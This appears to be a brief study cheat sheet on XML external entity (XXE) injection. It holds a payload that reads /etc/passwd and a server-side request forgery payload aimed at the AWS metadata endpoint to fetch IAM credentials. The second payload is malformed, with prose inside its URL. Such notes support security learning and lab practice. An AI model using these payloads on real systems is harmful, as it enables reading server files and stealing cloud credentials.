# XXE = XML external entity (extensible markup language)

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data

## LFI

Payload 

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [
    <!ENTITY signature SYSTEM "file:///etc/passwd">
    ]>

## SSRF

We use SYSTEM <URL> to try get credentials mayble example for aws

    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/data/iam/security-credentials/admin. This should return JSON containing the SecretAccessKey"> ]>

# Blind XXE
out of bound skipped, no collaborator and see HTB page

